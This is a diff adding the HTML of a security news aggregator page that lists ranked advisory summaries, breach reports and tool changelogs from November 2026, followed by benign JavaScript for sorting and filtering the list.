+<span>score 0.046</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0449" data-date="1793893730" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="secret scanning upgrades detectors, adds spacex as partner this update expands secret scanning&amp;#8217;s detection coverage: new partner: spacex is now a secret scanning partner. new detector: github now detects starlink_public_api_v2_secret. upgraded detectors: alibaba, aws, google, openvsx, pydantic services,&amp;#8230; the post secret scanning upgrades detectors, adds spacex as partner appeared first on the github blog . github aws github changelog   ">
+<div class="rank ">66</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-05-secret-scanning-upgrades-detectors-adds-spacex-as-partner" target="_blank" rel="noopener">Secret scanning upgrades detectors, adds SpaceX as partner</a></h2>
+<div class="summary">This update expands secret scanning&amp;#8217;s detection coverage: New partner: SpaceX is now a secret scanning partner. New detector: GitHub now detects starlink_public_api_v2_secret. Upgraded detectors: Alibaba, AWS, Google, OpenVSX, Pydantic Services,&amp;#8230; The post Secret scann…</div>
+<div class="kws"><span class="kw">github</span><span class="kw">aws</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 05</span>
+<span>score 0.045</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="" data-overflow="true" data-score="0.0071" data-date="1793880000" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="rustsec-2026-0442: unsoundness in arrow-data apache arrow rust: improper validation of runendencoded arrays allows out of bounds reads rust rustsec   ">
+<div class="rank ">67</div>
+<div class="body">
+<h2><a href="https://rustsec.org/advisories/RUSTSEC-2026-0442.html" target="_blank" rel="noopener">RUSTSEC-2026-0442: Unsoundness in arrow-data</a></h2>
+<div class="summary">Apache Arrow Rust: Improper validation of RunEndEncoded arrays allows out of bounds reads</div>
+<div class="kws"><span class="kw">rust</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">RustSec</span>
+<span>Nov 05</span>
+<span>score 0.007</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="medium" data-overflow="true" data-score="0.6616" data-date="1793811757" data-sevrank="2" data-cvss="6.5" data-corrob="2" data-text="arc: duckdb i/o aliases bypass database rbac after cve-2026-47735 affected: github.com/basekick-labs/arc. ### summary the fix for cve-2026-47735 (released 2026.06.1) is incomplete. it added a duckdb sandbox (`set global allowed_directories=[&lt;storage root&gt;]; set global enable_external_access=false`) and an arc sql-layer denylist of the **literal** functions `read_parquet(` and `arc_partition_agg(`. the sandbox correctly blocks reads **outside** the storage root (os files, `http://` ssrf), but it allowlists the **entire multi-tenant storage root**, and the sql denylist still misses the rest of the duckdb i/o family the original advisory enumerated. as a result, any authenticated token — including o github token ssrf cve- ghsa — go cve-2026-55098 medium ghsa — go">
+<div class="rank ">68</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-93cm-2v4m-c56c" target="_blank" rel="noopener">Arc: DuckDB I/O aliases bypass database RBAC after CVE-2026-47735</a></h2>
+<div class="summary">Affected: github.com/basekick-labs/arc. ### Summary The fix for CVE-2026-47735 (released 2026.06.1) is incomplete. It added a DuckDB sandbox (`SET GLOBAL allowed_directories=[&lt;storage root&gt;]; SET GLOBAL enable_external_access=false`) and an Arc SQL-layer denylist of the **literal…</div>
+<div class="kws"><span class="sev sev-medium">medium 6.5</span><span class="corrob">×2 reports</span><span class="cve">CVE-2026-55098</span><span class="kw">github</span><span class="kw">token</span><span class="kw">ssrf</span><span class="kw">cve-</span></div>
+<div class="also">also: <a href="https://github.com/advisories/GHSA-m3qr-fvp4-78xj" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — go</a></div>
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — go</span>
+<span>Nov 04</span>
+<span>score 0.662</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.3622" data-date="1793792787" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="xen hypervisor flaws let one malicious vm read and write any other vm&#x27;s memory two flaws in the xen hypervisor allow a malicious guest virtual machine (vm) to read and write the memory of other vms on the same host, including dom0. dom0 is the vm that, by default, has full permissions and manages the others. patches are out, and there is no known mitigation, the xen project said in an&amp;nbsp;advisory&amp;nbsp;on november 3. all xen versions from 4.6 onward are vulnerable, xen the hacker news   ">
+<div class="rank ">69</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/xen-hypervisor-flaws-let-one-malicious.html" target="_blank" rel="noopener">Xen Hypervisor Flaws Let One Malicious VM Read and Write Any Other VM&#x27;s Memory</a></h2>
+<div class="summary">Two flaws in the Xen hypervisor allow a malicious guest virtual machine (VM) to read and write the memory of other VMs on the same host, including dom0. Dom0 is the VM that, by default, has full permissions and manages the others. Patches are out, and there is no known mitigation…</div>
+<div class="kws"><span class="kw">xen</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.362</span>
+</div></div>
+<div class="item" data-cat="research" data-sev="" data-overflow="true" data-score="0.1495" data-date="1793750400" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="introducing sysdig ai defense: see, stop, and prove what agents do sysdig ai defense is runtime security and governance for every ai agent your teams run, from the laptop where an agent starts its work to the cloud where its actions land. it starts by showing you what’s there. it finds the agents, mcp servers, skills and plugins your people use, including the ones nobody approved, and ties each one to the account and the person behind it. teams sysdig   ">
+<div class="rank ">70</div>
+<div class="body">
+<h2><a href="https://webflow.sysdig.com/blog/introducing-sysdig-ai-defense" target="_blank" rel="noopener">Introducing Sysdig AI Defense: See, stop, and prove what agents do</a></h2>
+<div class="summary">Sysdig AI Defense is runtime security and governance for every AI agent your teams run, from the laptop where an agent starts its work to the cloud where its actions land. It starts by showing you what’s there. It finds the agents, MCP servers, skills and plugins your people use,…</div>
+<div class="kws"><span class="kw">teams</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-research">Sysdig</span>
+<span>Nov 04</span>
+<span>score 0.150</span>
+</div></div>
+<div class="item" data-cat="research" data-sev="" data-overflow="true" data-score="0.1430" data-date="1793805888" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="docker sandboxes vulnerability lets ai agents access sensitive files outside their sandbox (cve-2026-103916) | endor labs i discovered a vulnerability in docker sandboxes that lets ai coding agents bypass file access restrictions, potentially exposing cloud credentials and other sensitive files on a developer&#x27;s computer through a routine copy command. docker cve- endor labs cve-2026-103916  ">
+<div class="rank ">71</div>
+<div class="body">
+<h2><a href="https://www.endorlabs.com/learn/docker-sandboxes-vulnerability-lets-ai-agents-access-sensitive-files-outside-their-sandbox-cve-2026-103916" target="_blank" rel="noopener">Docker Sandboxes vulnerability lets AI agents access sensitive files outside their sandbox (CVE-2026-103916) | Endor Labs</a></h2>
+<div class="summary">I discovered a vulnerability in Docker Sandboxes that lets AI coding agents bypass file access restrictions, potentially exposing cloud credentials and other sensitive files on a developer&#x27;s computer through a routine copy command.</div>
+<div class="kws"><span class="cve">CVE-2026-103916</span><span class="kw">docker</span><span class="kw">cve-</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-research">Endor Labs</span>
+<span>Nov 04</span>
+<span>score 0.143</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="medium" data-overflow="true" data-score="0.1286" data-date="1793808874" data-sevrank="2" data-cvss="6.1" data-corrob="1" data-text="odf-kit: html injection leading to xss in odttohtml() and odstohtml() via unescaped style attribute values affected: odf-kit. ### summary odf style attribute values are interpolated into `style=&quot;...&quot;` attributes without html-escaping in **both** of odf-kit&#x27;s to-html renderers (`odttohtml` and `odstohtml`). a double-quote character inside an attacker-controlled style value breaks out of the attribute, allowing arbitrary html/attribute injection — and therefore script execution (xss) — from a crafted `.odt` or `.ods` file wherever the rendered output is inserted as html, which is the documented purpose of both functions. ### details #### odt renderer (`src/odt/to-html/html-renderer.ts`) the renderer has an `escapeh xss ghsa — npm cve-2026-113787 medium ">
+<div class="rank ">72</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-3cgg-c5pp-57h6" target="_blank" rel="noopener">odf-kit: HTML injection leading to XSS in odtToHtml() and odsToHtml() via unescaped style attribute values</a></h2>
+<div class="summary">Affected: odf-kit. ### Summary ODF style attribute values are interpolated into `style=&quot;...&quot;` attributes without HTML-escaping in **both** of odf-kit&#x27;s to-HTML renderers (`odtToHtml` and `odsToHtml`). A double-quote character inside an attacker-controlled style value breaks out o…</div>
+<div class="kws"><span class="sev sev-medium">medium 6.1</span><span class="cve">CVE-2026-113787</span><span class="kw">xss</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — npm</span>
+<span>Nov 04</span>
+<span>score 0.129</span>
+</div></div>
+<div class="item" data-cat="research" data-sev="" data-overflow="true" data-score="0.1091" data-date="1793750400" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="what one organization revealed about ai agent risk one company monitored ai agent activity for a month. see what sysdig ai defense found, from unapproved agents to unlogged credential reads. credential sysdig   ">
+<div class="rank ">73</div>
+<div class="body">
+<h2><a href="https://webflow.sysdig.com/blog/a-first-look-under-the-hood-of-ai-agents" target="_blank" rel="noopener">What one organization revealed about AI agent risk</a></h2>
+<div class="summary">One company monitored AI agent activity for a month. See what Sysdig AI Defense found, from unapproved agents to unlogged credential reads.</div>
+<div class="kws"><span class="kw">credential</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-research">Sysdig</span>
+<span>Nov 04</span>
+<span>score 0.109</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.0974" data-date="1793811646" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="debian and ubuntu apt flaw lets mitm attackers swap verified packages and run code as root a flaw in apt, the package manager for debian and ubuntu, allows an attacker who can modify package downloads to swap a checked package for their own. the attacker&#x27;s code then runs as root, according to advisories that&amp;nbsp;debian,&amp;nbsp;ubuntu, and&amp;nbsp;apt&#x27;s developers&amp;nbsp;published on november 4. the attack needs apt to retry failed downloads, which it does by default from debian 12 and ubuntu debian the hacker news   ">
+<div class="rank ">74</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/debian-and-ubuntu-apt-flaw-lets-mitm.html" target="_blank" rel="noopener">Debian and Ubuntu APT Flaw Lets MitM Attackers Swap Verified Packages and Run Code as Root</a></h2>
+<div class="summary">A flaw in APT, the package manager for Debian and Ubuntu, allows an attacker who can modify package downloads to swap a checked package for their own. The attacker&#x27;s code then runs as root, according to advisories that&amp;nbsp;Debian,&amp;nbsp;Ubuntu, and&amp;nbsp;APT&#x27;s developers&amp;nbsp;publ…</div>
+<div class="kws"><span class="kw">ubuntu</span><span class="kw">debian</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 04</span>
+<span>score 0.097</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0319" data-date="1793819440" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="github copilot is now available in xcode’s coding assistant you can now work with github copilot directly in xcode&amp;#8217;s built-in coding assistant, bringing copilot into your native xcode workflow. the integration is now in public preview, available starting with&amp;#8230; the post github copilot is now available in xcode&amp;#8217;s coding assistant appeared first on the github blog . github github changelog   ">
+<div class="rank ">75</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-04-github-copilot-is-now-available-in-xcodes-coding-assistant" target="_blank" rel="noopener">GitHub Copilot is now available in Xcode’s coding assistant</a></h2>
+<div class="summary">You can now work with GitHub Copilot directly in Xcode&amp;#8217;s built-in coding assistant, bringing Copilot into your native Xcode workflow. The integration is now in public preview, available starting with&amp;#8230; The post GitHub Copilot is now available in Xcode&amp;#8217;s coding as…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 04</span>
+<span>score 0.032</span>
+</div></div>
+<div class="item" data-cat="build" data-sev="" data-overflow="true" data-score="0.0242" data-date="1793822692" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="codeql 2.27.4 improves accuracy and query metadata codeql is the static analysis engine behind github code scanning, which finds and remediates security issues in your code. we&amp;#8217;ve recently released codeql 2.27.4 with query accuracy improvements across several&amp;#8230; the post codeql 2.27.4 improves accuracy and query metadata appeared first on the github blog . github github changelog   ">
+<div class="rank ">76</div>
+<div class="body">
+<h2><a href="https://github.blog/changelog/2026-11-04-codeql-2-27-4-improves-accuracy-and-query-metadata" target="_blank" rel="noopener">CodeQL 2.27.4 improves accuracy and query metadata</a></h2>
+<div class="summary">CodeQL is the static analysis engine behind GitHub code scanning, which finds and remediates security issues in your code. We&amp;#8217;ve recently released CodeQL 2.27.4 with query accuracy improvements across several&amp;#8230; The post CodeQL 2.27.4 improves accuracy and query metadat…</div>
+<div class="kws"><span class="kw">github</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-build">GitHub Changelog</span>
+<span>Nov 04</span>
+<span>score 0.024</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="" data-overflow="true" data-score="0.4790" data-date="1793679801" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="composer 2.11 adds dependency cooldowns composer 2.11 adds dependency cooldowns, joining package managers that delay new releases to reduce supply chain risks while allowing urgent security updates. composer supply chain socket blog   ">
+<div class="rank ">77</div>
+<div class="body">
+<h2><a href="https://socket.dev/blog/composer-dependency-cooldowns?utm_medium=feed" target="_blank" rel="noopener">Composer 2.11 Adds Dependency Cooldowns</a></h2>
+<div class="summary">Composer 2.11 adds dependency cooldowns, joining package managers that delay new releases to reduce supply chain risks while allowing urgent security updates.</div>
+<div class="kws"><span class="kw">composer</span><span class="kw">supply chain</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">Socket Blog</span>
+<span>Nov 03</span>
+<span>score 0.479</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.2457" data-date="1793729779" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="chainstack reports production systems breach exposing customer data and password hashes blockchain infrastructure provider chainstack on tuesday disclosed that it was targeted in a cyber attack that allowed an unauthorized party to gain access to some parts of its infrastructure. the incident is assessed to be part of a large-scale, artificial intelligence (ai)-powered attack campaign that came to light last week. &quot;an external attacker gained unauthorized access to part of breach the hacker news   ">
+<div class="rank ">78</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/chainstack-reports-production-systems.html" target="_blank" rel="noopener">Chainstack Reports Production Systems Breach Exposing Customer Data and Password Hashes</a></h2>
+<div class="summary">Blockchain infrastructure provider Chainstack on Tuesday disclosed that it was targeted in a cyber attack that allowed an unauthorized party to gain access to some parts of its infrastructure. The incident is assessed to be part of a large-scale, artificial intelligence (AI)-powe…</div>
+<div class="kws"><span class="kw">breach</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 03</span>
+<span>score 0.246</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.2406" data-date="1793691787" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="synology nas devices targeted in ransomware attacks exploiting patched dsm flaw synology is urging customers to update the diskstation manager (dsm) software powering its network attached storage (nas) devices following ransomware attacks. the taiwanese vendor said it observed threat actors exploiting a vulnerability patched in december 2024 to target devices running outdated versions of dsm. &quot;these attacks aim to encrypt data and extort ransom,&quot; it said in a statement ransomware the hacker news   ">
+<div class="rank ">79</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/synology-nas-devices-targeted-in.html" target="_blank" rel="noopener">Synology NAS Devices Targeted in Ransomware Attacks Exploiting Patched DSM Flaw</a></h2>
+<div class="summary">Synology is urging customers to update the DiskStation Manager (DSM) software powering its Network Attached Storage (NAS) devices following ransomware attacks. The Taiwanese vendor said it observed threat actors exploiting a vulnerability patched in December 2024 to target device…</div>
+<div class="kws"><span class="kw">ransomware</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 03</span>
+<span>score 0.241</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="" data-overflow="true" data-score="0.1575" data-date="1793724958" data-sevrank="0" data-cvss="0.0" data-corrob="1" data-text="binance reveals how fake job interviews and ai tool abuse led to $6.43 billion theft binance on tuesday said the record-setting theft of $6.43 billion in assets from the world&#x27;s largest cryptocurrency exchange was the culmination of a &quot;sophisticated, multi-stage campaign&quot; that involved the use of a tampered homebrew installation and recruitment-themed social engineering attack targeting two of its engineers. &quot;it was not a single isolated breach or a simple phishing incident,&quot; breach the hacker news   ">
+<div class="rank ">80</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/binance-reveals-how-fake-job-interviews.html" target="_blank" rel="noopener">Binance Reveals How Fake Job Interviews and AI Tool Abuse Led to $6.43 Billion Theft</a></h2>
+<div class="summary">Binance on Tuesday said the record-setting theft of $6.43 billion in assets from the world&#x27;s largest cryptocurrency exchange was the culmination of a &quot;sophisticated, multi-stage campaign&quot; that involved the use of a tampered Homebrew installation and recruitment-themed social engi…</div>
+<div class="kws"><span class="kw">breach</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 03</span>
+<span>score 0.158</span>
+</div></div></div>
+<button class="show-more" id="show-more">show more <span class="show-more-count" id="show-more-count"></span></button>
+<div class="empty" id="empty" style="display:none">no matches</div>
+<footer><span>feedrank.security</span><span><a href="feedrank.xml">atom</a> · <a href="feedrank.json">json</a> · <a href="feedrank.md">md</a></span></footer>
+</div>
+<script>
+const items=Array.from(document.querySelectorAll('.item')),search=document.getElementById('search'),chips=document.querySelectorAll('.chip'),empty=document.getElementById('empty');
+const itemsContainer=document.getElementById('items'),showMore=document.getElementById('show-more'),showMoreCount=document.getElementById('show-more-count');
+const sortButtons=document.querySelectorAll('.sort');
+const TOTAL=items.length,INITIAL=10,STEP=20;
+let activeCat='all',activeSev=null,reveal=INITIAL;
+let sortKey='trending',sortDir='desc';
+
+// Sort direction defaults — what makes intuitive sense when picking each key
+const DEFAULT_DIR={trending:'desc',date:'desc',sevrank:'desc',corrob:'desc'};
+
+function isFiltering(){
+  return search.value.trim()!==''||activeCat!=='all'||activeSev!==null;
+}
+
+function applySort(){
+  // The `trending` and `sevrank` chips handle their own tiebreak chains
+  // below; `date` and `corrob` fall into the generic numeric branch.
+  const numeric={date:1,corrob:1};
+  const sorted=[...items].sort((a,b)=>{
+    let cmp;
+    if(sortKey==='trending'){
+      // 4-key sort mirroring server rank(): tier (crit/high vs rest), day,
+      // is-critical, score. data-date = freshest cluster-member date.
+      const at=parseFloat(a.dataset.sevrank||0)>=3?1:0;
+      const bt=parseFloat(b.dataset.sevrank||0)>=3?1:0;
+      cmp=at-bt;
+      if(cmp===0){
+        const ad=Math.floor(parseFloat(a.dataset.date||0)/86400);
+        const bd=Math.floor(parseFloat(b.dataset.date||0)/86400);
+        cmp=ad-bd;
+      }
+      if(cmp===0){
+        const ac=parseFloat(a.dataset.sevrank||0)===4?1:0;
+        const bc=parseFloat(b.dataset.sevrank||0)===4?1:0;
+        cmp=ac-bc;
+      }
+      if(cmp===0) cmp=parseFloat(a.dataset.score||0)-parseFloat(b.dataset.score||0);
+    }else if(sortKey==='sevrank'){
+      // Severity-primary, CVSS tiebreak so CVSS 10 critical items appear
+      // above CVSS 9.0 critical items within the same severity bucket.
+      cmp=parseFloat(a.dataset.sevrank||0)-parseFloat(b.dataset.sevrank||0);
+      if(cmp===0) cmp=parseFloat(a.dataset.cvss||0)-parseFloat(b.dataset.cvss||0);
+    }else if(numeric[sortKey]){
+      cmp=parseFloat(a.dataset[sortKey]||0)-parseFloat(b.dataset[sortKey]||0);
+    }
+    // Final tiebreak: score desc — keeps ordering predictable
+    if(cmp===0){
+      const as=parseFloat(a.dataset.score||0),bs=parseFloat(b.dataset.score||0);
+      cmp=as-bs;
+    }
+    return sortDir==='asc'?cmp:-cmp;
+  });
+  // Reorder DOM
+  const frag=document.createDocumentFragment();
+  sorted.forEach(it=>frag.appendChild(it));
+  itemsContainer.appendChild(frag);
+  itemsContainer.dataset.sortKey=sortKey;
+  // Update arrow indicators
+  sortButtons.forEach(b=>{
+    const a=b.querySelector('.arrow');
+    if(b.dataset.sort===sortKey){
+      b.classList.add('active');
+      a.textContent=sortDir==='asc'?'↑':'↓';
+    }else{
+      b.classList.remove('active');
+      a.textContent='';
+    }
+  });
+}
+
+function apply(){
+  const q=search.value.trim();let regex=null,plain=q.toLowerCase();
+  if(q.startsWith('/')&&q.endsWith('/')&&q.length>2){try{regex=new RegExp(q.slice(1,-1),'i');plain='';}catch(e){}}
+  let visible=0;
+  items.forEach(it=>{
+    const cat=it.dataset.cat,sev=it.dataset.sev,text=it.dataset.text;
+    let show=(activeCat==='all'||cat===activeCat);
+    if(show&&activeSev==='critical')show=sev==='critical';
+    if(show&&activeSev==='high')show=(sev==='critical'||sev==='high');
+    if(show&&q)show=regex?regex.test(text):text.includes(plain);
+    it.classList.toggle('hidden',!show);if(show)visible++;
+  });
+  empty.style.display=visible===0?'block':'none';
+  updateOverflow();
+}
+
+function updateOverflow(){
+  // When filtering OR when sorted by something other than the default feed,
+  // show all (overflow gating only makes sense for the default view).
+  if(isFiltering()||sortKey!=='trending'){
+    itemsContainer.classList.remove('collapsed');
+    showMore.style.display='none';
+    renumber();
+    return;
+  }
+  // In default-feed view, mark items past the reveal threshold as overflow.
+  // Walk current DOM order so the threshold respects the active sort.
+  let r=0;
+  Array.from(itemsContainer.children).forEach(it=>{
+    r++;
+    it.dataset.overflow=(r>reveal)?'true':'false';
+  });
+  if(reveal>=TOTAL){
+    itemsContainer.classList.remove('collapsed');
+    showMore.style.display='none';
+  }else{
+    itemsContainer.classList.add('collapsed');
+    showMore.style.display='block';
+    showMoreCount.textContent='('+(TOTAL-reveal)+' more)';
+  }
+  renumber();
+}
+
+function renumber(){
+  // Rewrite rank text to match each item's current visible position so the
+  // numbering stays consistent across sort changes and filter toggles.
+  // Skip items hidden by filter or by collapsed-overflow.
+  const collapsed=itemsContainer.classList.contains('collapsed');
+  let r=0;
+  Array.from(itemsContainer.children).forEach(it=>{
+    if(it.classList.contains('hidden')) return;
+    if(collapsed&&it.dataset.overflow==='true') return;
+    r++;
+    const el=it.querySelector('.rank');
+    if(!el) return;
+    el.textContent=r<10?('0'+r):String(r);
+    el.classList.remove('rank-1','rank-2','rank-3');
+    if(r<=3) el.classList.add('rank-'+r);
+  });
+}
+
+showMore.addEventListener('click',()=>{
+  reveal=Math.min(reveal+STEP,TOTAL);
+  updateOverflow();
+});
+
+sortButtons.forEach(b=>b.addEventListener('click',()=>{
+  const key=b.dataset.sort;
+  if(key===sortKey){
+    // Toggle direction
+    sortDir=sortDir==='asc'?'desc':'asc';
+  }else{
+    sortKey=key;
+    sortDir=DEFAULT_DIR[key]||'desc';
+  }
+  applySort();
+  updateOverflow();
+}));
+
+search.addEventListener('input',apply);
+chips.forEach(c=>c.addEventListener('click',()=>{
+  if(c.dataset.cat){chips.forEach(x=>{if(x.dataset.cat)x.classList.remove('active')});c.classList.add('active');activeCat=c.dataset.cat;}
+  else if(c.dataset.sev){if(c.classList.contains('active')){c.classList.remove('active');activeSev=null;}else{chips.forEach(x=>{if(x.dataset.sev)x.classList.remove('active')});c.classList.add('active');activeSev=c.dataset.sev;}}
+  apply();
+}));
+
+document.addEventListener('keydown',e=>{
+  if(e.key==='/'&&document.activeElement!==search){e.preventDefault();search.focus();}
+  else if(e.key==='Escape'){
+    search.value='';activeCat='all';activeSev=null;
+    chips.forEach(x=>{x.classList.remove('active');if(x.dataset.cat==='all')x.classList.add('active');});
+    sortKey='trending';sortDir='desc';reveal=INITIAL;
+    applySort();apply();search.blur();
+  }
+});
+
+// Initial state
+itemsContainer.dataset.sortKey='trending';
+updateOverflow();
+</script>
+</body></html>
